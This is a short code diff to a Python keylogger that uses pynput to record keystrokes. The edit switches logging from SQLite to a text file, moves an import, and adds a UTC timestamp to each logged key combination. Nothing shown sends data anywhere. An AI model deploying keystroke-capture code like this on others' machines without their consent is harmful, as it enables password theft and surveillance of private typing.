@@ -22,8 +22,8 @@ from pynput.keyboard import Key, Listener
 # ######### User Settings ##########
 # ######### #### ######## ##########
 
-SEND_LOGS_TO_SQLITE = True
-SEND_LOGS_TO_FILE = False
+SEND_LOGS_TO_SQLITE = False
+SEND_LOGS_TO_FILE = True
 
 LOG_FILE_NAME = 'key_log.txt'
 SQLITE_FILE_NAME = 'key_log.sqlite'
@@ -39,8 +39,9 @@ logging.basicConfig(
     datefmt='%Y-%m-%d %H:%M:%S'
 )
 
+from datetime import datetime
+
 if SEND_LOGS_TO_SQLITE:
-  from datetime import datetime
   import sqlite3
 
 if SEND_LOGS_TO_FILE:
@@ -265,7 +266,7 @@ def log(key):
       for k in modifiers_down
   ])) == [Key.shift] and key_is_a_symbol(key):
     modifiers_down = []
-  log_entry = ' + '.join(
+  log_entry = datetime.utcnow().isoformat() + ': ' + ' + '.join(
       sorted([key_to_str(k) for k in modifiers_down])
       + [key_to_str(key)]
   )
